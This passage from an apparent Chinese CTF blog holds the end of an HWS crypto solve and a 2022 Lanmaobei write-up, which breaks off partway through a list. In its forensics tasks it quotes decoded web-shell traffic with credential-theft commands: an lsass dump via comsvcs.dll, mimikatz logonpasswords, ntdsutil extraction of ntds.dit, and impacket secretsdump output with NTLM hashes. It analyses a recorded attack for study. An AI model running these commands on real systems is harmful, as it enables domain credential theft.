&lt;&lt;= 1 tmp |= 1 else: tmp &lt;&lt;= 1 res |= (tmp) &amp; low state[i] = res return statedef hex2bin(x, bits): return bin(int(x, 16))[2:].zfill(bits)def getRndHex(rnd, bits): return hex(prng.getrandbits(bits))[2:].zfill(bits // 4)n = len(_id)num = []for i in range(n): x = hex2bin(_id[i], 128) y = hex2bin(_code[i], 256) for p in range(3, -1, -1): num.append(int(x[p * 32:(p + 1) * 32], 2)) for p in range(7, -1, -1): num.append(int(y[p * 32:(p + 1) * 32], 2))partS = recover_state(num)pre = backtrace([0] * 12 + partS, 12)[:624]prng = random.Random()prng.setstate((3, tuple(pre + [0]), None))pre_id = getRndHex(prng, 128)pre_code = getRndHex(prng, 256)flag = hashlib.md5((pre_id + pre_code).encode()).hexdigest()print(&#x27;flag&#123;%s&#125;&#x27; % flag)# flag&#123;22b307a4ac14c89888d5a6c79f7f963c&#125; math 看 chal.py，发现主要由 3 部分构成： 读取满足 $a^2 - D \\times b^2 = 1$ 的 $a$ 和 $b$ 同余 打乱 bits $a^2 - D \\times b^2 = 1$ 是经典的 PELL 方程，可以用连分数得到最小解，然后递推生成通解。 同余过程太经典了，可以直接通过 $a$ 在 $p$ 下的逆元和 $b$ 求出 $m$。 还有个打乱，一开始以为和上一道题一样要去看 getPrime 的源码，想想不太实际。 注意到 $m$ 肯定是小于 $p$ 的（不然不用解了），$p$ 只有 512 bits，85 bits 一个组，最多也就 6 组（事实上题目已经给了 $c$）。 直接全排列枚举复杂度才 6! = 720 完全可以接受，枚举 $a$, $b$ 通解，枚举全排列，求解 $m$ 看是否为 b'flag' 开头。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import itertoolsfrom gmpy2 import *from Crypto.Util.number import *def sol_PELL(D): m = isqrt(D) x = D**(0.5) num=[] num.append(m) b = m c = 1 while num[-1] != 2 * num[0]: c = (D - b**2) // c tmp = (x + b) // c num.append(int(tmp)) b = num[-1] * c - b num = num[:-1] num.reverse() x, y = 1, 0 for i in num: y, x = x, i * x + y return x, yD = 0x1337a0, b0 = sol_PELL(D)p = 11199186558148426014734492874345932099384932524559726349180064588241518696390926354448476750322781683505497782040786332571272422812867731614415519029276349plist = [&#x27;0010101111100011101101011111111001011000100110001001000000010001111011110101110011111&#x27;, &#x27;0011010010010010110010011011001100110001100010101110001010001101110001100000111011010&#x27;, &#x27;0110101101011101110000100001000000010001110110001010000000010110010101100100101110000&#x27;, &#x27;0100111001011010000101100111100110101100011100100111011000110001111101000110110101101&#x27;, &#x27;1100100110011101010011011111000101011011010000101100011001110100101000101101111110100&#x27;, &#x27;1110111110001110000101100000000100111010110000001111010001101001100001010110101010001&#x27;]def work(a, b): inv = invert(a, p) perms = list(itertools.permutations(plist)) for perm in perms: s = &#x27;&#x27; for _ in perm: s = s + _ num = int(s, 2) % p m = ((num - b) % p + p) % p m = m * inv % p assert(num == (a * m + b) % p) flag = long_to_bytes(m) if (flag[:4] == b&#x27;flag&#x27;): print(flag) return True return Falsea, b = a0, b0while not work(a, b): a, b = a * a0 + D * b * b0, a * b0 + b * a0 assert(a**2 - D * b**2 == 1) # b&#x27;flag&#123;5b80aaa2-2bb2-0ef1-4aa0-a5a9387239d5&#125;&#x27;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://sxyugao.top/categories/CTF/"},{"name":"HWS","slug":"CTF/HWS","permalink":"https://sxyugao.top/categories/CTF/HWS/"}],"tags":[{"name":"HWS","slug":"HWS","permalink":"https://sxyugao.top/tags/HWS/"}]},{"title":"蓝帽杯 2022 Writeup","slug":"蓝帽杯-2022-Writeup","date":"2022-08-01T12:04:03.000Z","updated":"2022-08-10T03:27:37.478Z","comments":true,"path":"p/533ccbb.html","permalink":"https://sxyugao.top/p/533ccbb.html","excerpt":"7月底划水打了蓝帽杯，然后一直没写 wp 鸽到现在，感觉整个暑假啥也没干，应该写点啥。","text":"7月底划水打了蓝帽杯，然后一直没写 wp 鸽到现在，感觉整个暑假啥也没干，应该写点啥。 Misc domainhacker 本来在准备 hvv，但由于疫情原因不了了之。不过鉴于那段时间的培训，一下子就分辨出是蚁剑的流量。本题的流量是经过 base64 加密并且加 Salt 的，不过可以从代码还原出来。 在流量包的请求体中能轻松辨别出参数，解码后依次有以下这些有用的指令： 123456cd /d &quot;C:\\\\phpstudy_pro\\\\WWW&quot;&amp;powershell -c &quot;rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 476 C:\\windows\\temp\\lsass.dmp full&quot;&amp;echo efa923ba504&amp;cd&amp;echo 1a4be8815ef8# 将内存中 dump 出来cd /d &quot;c:\\\\Windows\\\\Temp&quot;&amp;mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; 1.txt&amp;echo efa923ba504&amp;cd&amp;echo 1a4be8815ef8# 用 mimikatz 把内存中的域信息导出到 1.txtcd /d &quot;c:\\\\Windows\\\\Temp&quot;&amp;rar.exe a -PSecretsPassw0rds 1.rar 1.txt&amp;echo efa923ba504&amp;cd&amp;echo 1a4be8815ef8# 进行加密压缩 这样我们就知道压缩包密码是 SecretsPassw0rds，之后还有个下载请求，分离出压缩包，解压得到 1.txt： 123456789101112131415161718192021222324Authentication Id : 0 ; 996 (00000000:000003e4)Session : Service from 0User Name : PDC$Domain : TESTLogon Server : (null)Logon Time : 2022/4/15 22:22:24SID : S-1-5-20 msv : [00000003] Primary * Username : PDC$ * Domain : TEST * NTLM : 416f89c3a5deb1d398a1a1fce93862a7 * SHA1 : 54896b6f5e60e9be2b46332b13d0e0f110d6518f tspkg : wdigest : * Username : PDC$ * Domain : TEST * Password : (null) kerberos : * Username : pdc$ * Domain : test.local * Password : 15 e0 7e 07 d9 9d 3d 42 45 40 38 ec 97 d6 25 59 c9 e8 05 d9 fa bd 81 f9 2e 05 67 84 e1 a3 a3 ec eb 65 ba 6e b9 60 9b dd 5a 74 4b 2e 07 68 94 fd a1 cb 2e 7b a2 13 07 31 34 c2 1d e8 95 53 43 38 61 91 53 2b c4 b0 3e ea 7a ac 03 60 1f bf e8 dc 00 c5 fe 13 ed 7a ca 88 32 fc d0 c6 ea d2 c7 b4 87 31 82 dd 4c 96 4f 23 80 39 2e 31 b0 cf 67 8e 63 b2 5e f9 77 32 44 05 8e 22 f9 0c 69 32 64 1b b8 2d a0 99 0e b8 0e 2c 10 b6 ff 6d 5f 11 c9 5e 46 eb 62 df 00 7a bd c6 7b 83 db 0f 58 ed ac a3 66 dd c2 ec df 9f 22 b3 34 0d 07 89 ea 3b 2b b1 e1 f9 e2 e5 85 cd a3 78 ae dd e3 98 78 39 8e 4f 49 5a b6 05 4c 6d 1a e6 fa 30 c7 c6 fb 4d dc b4 ca f6 3c 20 fe 70 eb e3 16 82 78 f8 49 8d 15 6a 15 10 ac d8 68 f8 ef ad 0c c2 39 f2 ca 80 ef 96 ssp : KO credman : 把 NTLM 的值作为 flag 即可：flag&#123;416f89c3a5deb1d398a1a1fce93862a7&#125; domainhacker2 类似的，同样是蚁剑的流量，不过指令种类更加丰富（有机会来分析一下各类流量）。 同样提取出有用的指令： 1cd /d &quot;C:\\\\phpstudy_pro\\\\WWW&quot;&amp;dsquery computer&amp;echo 1d3632&amp;cd&amp;echo 78bc462ab 获取到域中的计算机（CN = Common Name，OU = Organizational Unit，DC = Domain Component）： 12345678&quot;CN=PDC,OU=Domain Controllers,DC=test,DC=local&quot;&quot;CN=EXCHANGE,CN=Computers,DC=test,DC=local&quot;&quot;CN=SDC,OU=Domain Controllers,DC=test,DC=local&quot;&quot;CN=testnew,CN=Computers,DC=test,DC=local&quot;&quot;CN=WIN-PJ6ELFEG09P,CN=Computers,DC=test,DC=local&quot;&quot;CN=testcomputer,CN=Computers,DC=test,DC=local&quot;&quot;CN=t,CN=Computers,DC=test,DC=local&quot;&quot;CN=tt,CN=Computers,DC=test,DC=local&quot; 获取本机名： 1cd /d &quot;C:\\\\phpstudy_pro\\\\WWW&quot;&amp;hostname&amp;echo 1d3632&amp;cd&amp;echo 78bc462ab 得知本机为 PDC，结合之前的域信息得知本机就是域管理员。 新建了一个 log.txt，并写入以下内容： 12345ac i ntdsifmcreate full c:\\windows\\temp\\newqq 与这篇文章相同的方法（只是把 log.txt 作为流输入了）导出密钥信息： 1cd /d &quot;C:\\\\phpstudy_pro\\\\WWW&quot;&amp;cmd.exe /c ntdsutil.exe &lt; log.txt &gt;err.txt 2&gt;&amp;1&amp;echo 1d3632&amp;cd&amp;echo 78bc462ab 导出到 err.txt，并获得回显： 123456789101112131415161718192021ntdsutil.exe: 活动实例设置为“ntds”。ntdsutil.exe: ifm: 正在创建快照...成功生成快照集 &#123;f9c1f274-352f-439a-bdaa-7c3dd12b17c9&#125;。快照 &#123;2c502f9f-0060-4286-a0f3-f1c10becc9db&#125; 已作为 C:\\$SNAP_202204161011_VOLUMEC$\\ 装载已装载快照 &#123;2c502f9f-0060-4286-a0f3-f1c10becc9db&#125;。正在启动碎片整理模式... 源数据库: C:\\$SNAP_202204161011_VOLUMEC$\\Windows\\NTDS\\ntds.dit 目标数据库: c:\\windows\\temp\\new\\Active Directory\\ntds.dit Defragmentation Status (% complete) 0 10 20 30 40 50 60 70 80 90 100 |----|----|----|----|----|----|----|----|----|----| ...................................................正在复制注册表文件...正在复制 c:\\windows\\temp\\new\\registry\\SYSTEM正在复制 c:\\windows\\temp\\new\\registry\\SECURITY快照 &#123;2c502f9f-0060-4286-a0f3-f1c10becc9db&#125; 已卸载。在 c:\\windows\\temp\\new 中成功创建 IFM 媒体。ifm: ntdsutil.exe: 1d3632 然后和前一题一样使用压缩包打包，密码是 FakePassword123$，不得不说挺有迷惑性的： 1cd /d &quot;c:\\\\Windows\\\\Temp&quot;&amp;rar.exe a -PFakePassword123$ ntds.rar new&amp;echo 1d3632&amp;cd&amp;echo 78bc462ab 我们用 impacket 的 secretsdump 脚本导出密钥信息，注意要历史密钥： 1python secretsdump.py -system &quot;domainhacker2_184c16876d41965a695f89232ae5392d\\new\\registry\\SYSTEM&quot; -security &quot;domainhacker2_184c16876d41965a695f89232ae5392d\\new\\registry\\SECURITY&quot; -ntds &quot;domainhacker2_184c16876d41965a695f89232ae5392d\\new\\Active Directory\\ntds.dit&quot; LOCAL -just-dc-ntlm -history 省略了中间的一些邮箱服务检测账户： 1234567891011121314151617181920212223242526272829303132333435363738Impacket v0.10.1.dev1+20220708.213759.8b1a99f7 - Copyright 2022 SecureAuth Corporation[*] Target system bootKey: 0xf5a55bb9181f33269276949d2ad680e5[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)[*] Searching for pekList, be patient[*] PEK # 0 found and decrypted: 752aa10b88b269bd735d54b802d5c86c[*] Reading and decrypting hashes from C:\\Users\\YuGao\\Downloads\\domainhacker2_184c16876d41965a695f89232ae5392d\\new\\Active Directory\\ntds.dittest.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:a85016dddda9fe5a980272af8f54f20e:::test.local\\Administrator_history0:500:aad3b435b51404eeaad3b435b51404ee:07ab403ab740c1540c378b0f5aaa4087:::test.local\\Administrator_history1:500:aad3b435b51404eeaad3b435b51404ee:34e92e3e4267aa7055a284d9ece2a3ee:::test.local\\Administrator_history2:500:aad3b435b51404eeaad3b435b51404ee:34e92e3e4267aa7055a284d9ece2a3ee:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Admin:1001:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::test:1003:aad3b435b51404eeaad3b435b51404ee:4f95f1c5acfc3b972a1ce2a29ef1f1c5:::test_history0:1003:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::test_history1:1003:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::PDC$:1004:aad3b435b51404eeaad3b435b51404ee:416f89c3a5deb1d398a1a1fce93862a7:::PDC$_history0:1004:aad3b435b51404eeaad3b435b51404ee:77c3da77dc1b7a6c257ba59cd4633209:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8d9c46df1a433693842082203898424f:::EXCHANGE$:1107:aad3b435b51404eeaad3b435b51404ee:8f203498c3054ed0e01efc9d1da10ecd:::EXCHANGE$_history0:1107:aad3b435b51404eeaad3b435b51404ee:c5c7378155dc9d28ad53d8c1f9e9d915:::......test1:1149:aad3b435b51404eeaad3b435b51404ee:8cbbbea6034f5c9ea6bc4eb980efec4d:::test1_history0:1149:aad3b435b51404eeaad3b435b51404ee:8cbbbea6034f5c9ea6bc4eb980efec4d:::test1_history1:1149:aad3b435b51404eeaad3b435b51404ee:8cbbbea6034f5c9ea6bc4eb980efec4d:::test1_history2:1149:aad3b435b51404eeaad3b435b51404ee:8cbbbea6034f5c9ea6bc4eb980efec4d:::test1_history3:1149:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::SDC$:1151:aad3b435b51404eeaad3b435b51404ee:9f40caf799bf0d110fdf08b3bf3eb6c0:::SDC$_history0:1151:aad3b435b51404eeaad3b435b51404ee:8f3cfaf7a6290b735bcbba5b60d554d4:::SDC$_history1:1151:aad3b435b51404eeaad3b435b51404ee:7bfe440904b9611776477b85eea398fc:::testnew$:1152:aad3b435b51404eeaad3b435b51404ee:c22b315c040ae6e0efee3518d830362b:::WIN-PJ6ELFEG09P$:1153:aad3b435b51404eeaad3b435b51404ee:6533cba50e01cace16567ec5691e587f:::testcomputer$:1154:aad3b435b51404eeaad3b435b51404ee:c22b315c040ae6e0efee3518d830362b:::t$:1155:aad3b435b51404eeaad3b435b51404ee:c22b315c040ae6e0efee3518d830362b:::tt$:1156:aad3b435b51404eeaad3b435b51404ee:c22b315c040ae6e0efee3518d830362b:::WebApp01$:1157:aad3b435b51404eeaad3b435b51404ee:b021fa4e92913d91a6eade97884f508b:::aaa:1158:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::[*] Cleaning up... 题目要的是 administrator 的上一次 ntlm，别弄错了！ flag&#123;07ab403ab740c1540c378b0f5aaa4087&#125; 电子取证 手机取证 感觉是推销盘古石取证的题（雾），用给的工具找就行了，纯粹的签到题。 计算机取证_1 用老牌工具 volatility 直接 hashdump 即可，值得注意的是 volatility3 的使用方法和 v2 有很大的不同，网上也没啥教程，摸索了半天。 下面的是最后弄出来的最简单的办法，中途用的是 volshell，非常折磨。 1.\\vol.py -f 1.dmp windows.hashdump.Hashdump 123456789Volatility 3 Framework 2.3.0Progress: 100.00 PDB scanning finishedUser rid lmhash nthashAdministrator 500 aad3b435b51404eeaad3b435b51404ee 31d6cfe0d16ae931b73c59d7e0c089c0Guest 501 aad3b435b51404eeaad3b435b51404ee 31d6cfe0d16ae931b73c59d7e0c089c0taqi7 1000 aad3b435b51404eeaad3b435b51404ee 7f21caca5685f10d9e849cc84c340528naizheng 1002 aad3b435b51404eeaad3b435b51404ee d123b09e13b1a82277c3e3f0ca722060qinai 1003 aad3b435b51404eeaad3b435b51404ee 1c333843181864a58156f3e9498fe905 拿 7f21caca5685f10d9e849cc84c340528 去 MD5 网站查询得到是 anxinqi。 计算机取证_2 还是用的 volatility： 1.\\vol.py -f &quot;C:\\Users\\YuGao\\Documents\\Tencent Files\\2645943187\\FileRecv\\计算机取证\\1.dmp&quot; windows.pslist.PsList &gt; log.txt 12345678910111213141516171819202122232425262728293031323334353637383940414243444546Volatility 3 Framework 2.3.0PID PPID ImageFileName Offset(V) Threads Handles SessionId Wow64 CreateTime ExitTime File output4 0 System 0xfa800ccc7890 105 623 N/A False 2022-04-28 05:38:41.000000 N/A Disabled288 4 smss.exe 0xfa800d9c3610 2 29 N/A False 2022-04-28 05:38:41.000000 N/A Disabled384 376 csrss.exe 0xfa800e100740 9 486 0 False 2022-04-28 05:38:42.000000 N/A Disabled424 376 wininit.exe 0xfa800e4a3840 3 78 0 False 2022-04-28 05:38:43.000000 N/A Disabled436 416 csrss.exe 0xfa800e4a7b30 10 645 1 False 2022-04-28 05:38:43.000000 N/A Disabled492 416 winlogon.exe 0xfa800e50b060 5 116 1 False 2022-04-28 05:38:43.000000 N/A Disabled532 424 services.exe 0xfa800e523910 6 216 0 False 2022-04-28 05:38:43.000000 N/A Disabled544 424 lsass.exe 0xfa800e52fb30 6 614 0 False 2022-04-28 05:38:43.000000 N/A Disabled552 424 lsm.exe 0xfa800e489060 11 209 0 False 2022-04-28 05:38:43.000000 N/A Disabled...1020 776 audiodg.exe 0xfa800e6f7060 6 131 0 False 2022-04-28 05:38:44.000000 N/A Disabled420 532 svchost.exe 0xfa800e722060 9 530 0 False 2022-04-28 05:38:44.000000 N/A Disabled956 532 ZhuDongFangYu. 0xfa800e749b30 26 394 0 True 2022-04-28 05:38:44.000000 N/A Disabled1040 532 svchost.exe 0xfa800e75a950 23 636 0 False 2022-04-28 05:38:44.000000 N/A Disabled1300 532 spoolsv.exe 0xfa800e85b570 12 313 0 False 2022-04-28 05:38:45.000000 N/A Disabled1336 532 svchost.exe 0xfa800e88cb30 17 321 0 False 2022-04-28 05:38:45.000000 N/A Disabled1440 532 svchost.exe 0xfa800e907630 4 81 0 True 2022-04-28 05:38:45.000000 N/A Disabled1548 532 vmtoolsd.exe 0xfa800e9c6740 9 276 0 False 2022-04-28 05:38:45.000000 N/A Disabled1960 532 svchost.exe 0xfa800eabd060 5 101 0 False 2022-04-28 05:38:46.000000 N/A Disabled1612 532 dllhost.exe 0xfa800eb07b30 13 186 0 False 2022-04-28 05:38:46.000000 N/A Disabled2068 532 msdtc.exe 0xfa800eb36b30 12 144 0 False 2022-04-28 05:38:48.000000 N/A Disabled2512 532 svchost.exe 0xfa800eabe980 11 146 0 False 2022-04-28 05:40:46.000000 N/A Disabled2584 532 svchost.exe 0xfa800ea79b30 13 335 0 False 2022-04-28 05:40:46.000000 N/A Disabled2648 532 SearchIndexer. 0xfa800eaa8310 11 658 0 False 2022-04-28 05:40:47.000000 N/A Disabled1792 660 WmiPrvSE.exe 0xfa800ea7a0f0 7 114 0 False 2022-04-28 05:42:48.000000 N/A Disabled916 532 taskhost.exe 0xfa800cdf4b30 9 209 1 False 2022-04-28 05:42:55.000000 N/A Disabled972 920 dwm.exe 0xfa800cdfe210 3 70 1 False 2022-04-28 05:42:55.000000 N/A Disabled2044 1716 explorer.exe 0xfa800e585b30 53 1335 1 False 2022-04-28 05:42:55.000000 N/A Disabled2672 2044 vmtoolsd.exe 0xfa800e83eb30 7 209 1 False 2022-04-28 05:42:56.000000 N/A Disabled2664 2044 ldnews.exe 0xfa800e84f780 10 363 1 True 2022-04-28 05:42:56.000000 N/A Disabled2436 956 360Tray.exe 0xfa800ea25580 150 1455 1 True 2022-04-28 05:42:57.000000 N/A Disabled3500 2288 LiveUpdate360. 0xfa800edc8b30 18 305 1 True 2022-04-28 05:43:13.000000 N/A Disabled4012 3784 360TptMon.exe 0xfa800ee90b30 17 415 1 True 2022-04-28 05:43:22.000000 N/A Disabled3316 532 svchost.exe 0xfa800ee6bb30 3 57 0 True 2022-04-28 05:43:23.000000 N/A Disabled3396 2436 SoftMgrLite.ex 0xfa800eb76b30 30 360 1 True 2022-04-28 05:44:13.000000 N/A Disabled3496 2044 TrueCrypt.exe 0xfa800ec4b630 5 268 1 True 2022-04-28 05:46:22.000000 N/A Disabled2964 3496 TrueCrypt Form 0xfa800ea45b30 0 - 1 False 2022-04-28 05:46:35.000000 2022-04-28 05:47:59.000000 Disabled2548 2648 SearchProtocol 0xfa800ed78720 7 316 0 False 2022-04-28 05:52:53.000000 N/A Disabled2872 2044 notepad.exe 0xfa800ec2e6f0 1 62 1 False 2022-04-28 05:54:13.000000 N/A Disabled2192 2044 MagnetRAMCaptu 0xfa800f103b30 16 333 1 True 2022-04-28 05:54:30.000000 N/A Disabled3880 2436 360speedld.exe 0xfa800ea7b910 4 94 1 True 2022-04-28 05:54:54.000000 N/A Disabled3604 660 dllhost.exe 0xfa800ef76b30 6 91 1 False 2022-04-28 05:54:55.000000 N/A Disabled 可以看到有个 MagnetRAMCaptu，一看就是制作内存镜像的，PID 就是答案。 网站取证_1 直接搜索常见的木马特征如 assert eval 等发现直接找到了。 后门在 runtime\\temp 目录下。 网站取证_2 直接源码搜索“数据库”，发现有个 database.php 规定了数据库有关信息。 引用了 encrypt/encrypt.php，并且密码由 my_encrypt() 生成。 继续跟进，找到函数 my_encrypt，运行即可： 1234567891011121314function my_encrypt()&#123; $str = &#x27;P3LMJ4uCbkFJ/RarywrCvA==&#x27;; $str = str_replace(array(&quot;/r/n&quot;, &quot;/r&quot;, &quot;/n&quot;), &quot;&quot;, $str); $key = &#x27;PanGuShi&#x27;; $iv = substr(sha1($key),0,16); $td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,&quot;&quot;,MCRYPT_MODE_CBC,&quot;&quot;); mcrypt_generic_init($td, &quot;PanGuShi&quot;, $iv); $decode = base64_decode($str); $dencrypted = mdecrypt_generic($td, $decode); mcrypt_generic_deinit($td); mcrypt_module_close($td); $dencrypted = trim($dencrypted); return $dencrypted;&#125; 得到答案 KBLT123 网站取证_3 发现金额有关的变量名都和 money 有关，源码搜索，发现 $param['money'] = $this-&gt;encrypt($param['money']); 查看 encrypt 函数： 1234567891011121314151617181920212223function encrypt($data, $key = &#x27;jyzg123456&#x27;)&#123; $key = md5($key); $x = 0; $len = strlen($data); $l = strlen($key); $char = &#x27;&#x27;; $str = &#x27;&#x27;; for ($i = 0; $i &lt; $len; $i++) &#123; if ($x == $l) &#123; $x = 0; &#125; $char .= $key&#123;$x&#125;; $x++; &#125; for ($i = 0; $i &lt; $len; $i++) &#123; $str .= chr(ord($data&#123;$i&#125;) + (ord($char&#123;$i&#125;)) % 256); &#125; return base64_encode($str);&#125; 发现 Salt 就是 jyzg123456。 网站取证_4 把数据库中表以及列的作用都弄明白： 123456789101112131415161718192021222324252627282930313233343536373839404142COMMENT ON COLUMN &quot;public&quot;.&quot;tab_user&quot;.&quot;id&quot; IS &#x27;用户id&#x27;;COMMENT ON COLUMN &quot;public&quot;.&quot;tab_user&quot;.&quot;name&quot; IS &#x27;用户名&#x27;;COMMENT ON COLUMN &quot;public&quot;.&quot;tab_user&quot;.&quot;password&quot; IS &#x27;用户密码&#x27;;COMMENT ON COLUMN &quot;public&quot;.&quot;tab_user&quot;.&quot;role&quot; IS &#x27;用户权限角色1：超级管理员2：系统管理员3：仓库管理员4：门店管理员5：分销商6：装修公司7：业务员8：技术员&#x27;;COMMENT ON COLUMN &quot;public&quot;.&quot;tab_user&quot;.&quot;state&quot; IS &#x27;激活状态（1：激活使用 ，2：暂停使用）&#x27;;COMMENT ON COLUMN &quot;public&quot;.&quot;tab_user&quot;.&quot;belong_to&quot; IS &#x27;所属门店&#x27;;COMMENT ON COLUMN &quot;public&quot;.&quot;tab_user&quot;.&quot;nick_name&quot; IS &#x27;用户姓名&#x27;;COMMENT ON COLUMN &quot;public&quot;.&quot;tab_user&quot;.&quot;sex&quot; IS &#x27;性别（1：男 2：女）&#x27;;COMMENT ON COLUMN &quot;public&quot;.&quot;tab_user&quot;.&quot;tel&quot; IS &#x27;联系电话&#x27;;COMMENT ON COLUMN &quot;public&quot;.&quot;tab_user&quot;.&quot;address&quot; IS &#x27;地址&#x27;;COMMENT ON COLUMN &quot;public&quot;.&quot;tab_user&quot;.&quot;report_num&quot; IS &#x27;业务员最大报备数&#x27;;COMMENT ON COLUMN &quot;public&quot;.&quot;tab_user&quot;.&quot;is_create_time&quot; IS &#x27;创建时间&#x27;;COMMENT ON TABLE &quot;public&quot;.&quot;tab_user&quot; IS &#x27;用户表&#x27;; INSERT INTO &quot;public&quot;.&quot;tab_user&quot; VALUES (3, &#x27;张宝&#x27;, &#x27;967ee505bd742d713528ad2e55a04bba&#x27;, 3, 1, NULL, &#x27;&#x27;, 1, &#x27;&#x27;, &#x27;&#x27;, NULL, &#x27;158720003133&#x27;, NULL, &#x27;2018-04-09 19:00:00&#x27;);INSERT INTO &quot;public&quot;.&quot;tab_user&quot; VALUES (4, &#x27;李进&#x27;, &#x27;34b5c38d19b3352df6db3e976b237d37&#x27;, 3, 1, NULL, &#x27;&#x27;, 1, &#x27;&#x27;, &#x27;&#x27;, NULL, &#x27;18765877676&#x27;, NULL, &#x27;2018-04-09 19:00:00&#x27;);INSERT INTO &quot;public&quot;.&quot;tab_user&quot; VALUES (5, &#x27;王子豪&#x27;, &#x27;f783ca62ff21833fdcfe3b74e1a82e1c&#x27;, 3, 1, NULL, &#x27;王子豪&#x27;, 1, &#x27;&#x27;, &#x27;&#x27;, NULL, &#x27;&#x27;, NULL, &#x27;2020-04-18 16:04:53&#x27;);INSERT INTO &quot;public&quot;.&quot;tab_user&quot; VALUES (6, &#x27;赵燕&#x27;, &#x27;bca725be29834465fa5a9e3bc6423b48&#x27;, 3, 1, NULL, &#x27;赵燕&#x27;, 2, &#x27;&#x27;, &#x27;&#x27;, NULL, &#x27;&#x27;, NULL, &#x27;2020-04-18 16:06:06&#x27;);INSERT INTO &quot;public&quot;.&quot;tab_user&quot; VALUES (1, &#x27;superAdmin&#x27;, &#x27;ca6d00723bc83590c909b0decc97e34d&#x27;, 1, 1, NULL, &#x27;&#x27;, 1, &#x27;&#x27;, &#x27;&#x27;, NULL, &#x27;158736346560&#x27;, NULL, &#x27;2018-04-08 18:02:21&#x27;);INSERT INTO &quot;public&quot;.&quot;tab_user&quot; VALUES (2, &#x27;admin&#x27;, &#x27;aa590a519a1c4862c5051a9bb0e07456&#x27;, 2, 1, NULL, &#x27;&#x27;, 1, &#x27;&#x27;, &#x27;&#x27;, NULL, &#x27;158736377751&#x27;, NULL, &#x27;2018-04-09 18:22:21&#x27;);COMMENT ON COLUMN &quot;public&quot;.&quot;tab_channel_order_list&quot;.&quot;order_num&quot; IS &#x27;订单号&#x27;;COMMENT ON COLUMN &quot;public&quot;.&quot;tab_channel_order_list&quot;.&quot;currency&quot; IS &#x27;币种&#x27;;COMMENT ON COLUMN &quot;public&quot;.&quot;tab_channel_order_list&quot;.&quot;remark&quot; IS &#x27;备注&#x27;;COMMENT ON COLUMN &quot;public&quot;.&quot;tab_channel_order_list&quot;.&quot;is_create_time&quot; IS &#x27;创建时间&#x27;;COMMENT ON COLUMN &quot;public&quot;.&quot;tab_channel_order_list&quot;.&quot;payee_id&quot; IS &#x27;收款人ID&#x27;;COMMENT ON COLUMN &quot;public&quot;.&quot;tab_channel_order_list&quot;.&quot;payer_id&quot; IS &#x27;付款人ID&#x27;;-- ------------------------------ Records of tab_channel_order_list-- ----------------------------INSERT INTO &quot;public&quot;.&quot;tab_channel_order_list&quot; VALUES (1, &#x27;271188138699&#x27;, &#x27;GG币&#x27;, NULL, &#x27;2022-04-01 00:00:50&#x27;, 4, 2, &#x27;nJ1xlG5v&#x27;);...INSERT INTO &quot;public&quot;.&quot;tab_channel_order_list&quot; VALUES (5000, &#x27;622260854407&#x27;, &#x27;GG币&#x27;, NULL, &#x27;2022-04-30 23:55:13&#x27;, 4, 3, &#x27;lJRvnWtr&#x27;); 将语句处理成易于读取的格式： data.txt： 123456(1, &#x27;271188138699&#x27;, &#x27;2022-04-01 00:00:50&#x27;, 4, 2, &#x27;nJ1xlG5v&#x27;)(2, &#x27;272206877227&#x27;, &#x27;2022-04-01 00:23:01&#x27;, 4, 3, &#x27;lpZqmGps&#x27;)...(4998, &#x27;331754109613&#x27;, &#x27;2022-04-30 23:32:04&#x27;, 6, 2, &#x27;mplrlW9p&#x27;)(4999, &#x27;109211499552&#x27;, &#x27;2022-04-30 23:35:25&#x27;, 4, 6, &#x27;mphwnXBr&#x27;)(5000, &#x27;622260854407&#x27;, &#x27;2022-04-30 23:55:13&#x27;, 4, 3, &#x27;lJRvnWtr&#x27;) exchange_rate.txt： 123456789101112131415161718192021222324252627282930(&#x27;1&#x27;, 0.05, &#x27;2022-04-01&#x27;)(&#x27;2&#x27;, 0.04, &#x27;2022-04-02&#x27;)(&#x27;3&#x27;, 0.06, &#x27;2022-04-03&#x27;)(&#x27;4&#x27;, 0.05, &#x27;2022-04-04&#x27;)(&#x27;5&#x27;, 0.07, &#x27;2022-04-05&#x27;)(&#x27;6&#x27;, 0.10, &#x27;2022-04-06&#x27;)(&#x27;7&#x27;, 0.15, &#x27;2022-04-07&#x27;)(&#x27;8&#x27;, 0.17, &#x27;2022-04-08&#x27;)(&#x27;9&#x27;, 0.23, &#x27;2022-04-09&#x27;)(&#x27;10&#x27;, 0.22, &#x27;2022-04-10&#x27;)(&#x27;11&#x27;, 0.25, &#x27;2022-04-11&#x27;)(&#x27;12&#x27;, 0.29, &#x27;2022-04-12&#x27;)(&#x27;13&#x27;, 0.20, &#x27;2022-04-13&#x27;)(&#x27;14&#x27;, 0.28, &#x27;2022-04-14&#x27;)(&#x27;15&#x27;, 0.33, &#x27;2022-04-15&#x27;)(&#x27;16&#x27;, 0.35, &#x27;2022-04-16&#x27;)(&#x27;17&#x27;, 0.35, &#x27;2022-04-17&#x27;)(&#x27;18&#x27;, 0.37, &#x27;2022-04-18&#x27;)(&#x27;19&#x27;, 0.38, &#x27;2022-04-19&#x27;)(&#x27;20&#x27;, 0.40, &#x27;2022-04-20&#x27;)(&#x27;21&#x27;, 0.38, &#x27;2022-04-21&#x27;)(&#x27;22&#x27;, 0.39, &#x27;2022-04-22&#x27;)(&#x27;23&#x27;, 0.45, &#x27;2022-04-23&#x27;)(&#x27;24&#x27;, 0.44, &#x27;2022-04-24&#x27;)(&#x27;25&#x27;, 0.50, &#x27;2022-04-25&#x27;)(&#x27;26&#x27;, 0.55, &#x27;2022-04-26&#x27;)(&#x27;27&#x27;, 0.51, &#x27;2022-04-27&#x27;)(&#x27;28&#x27;, 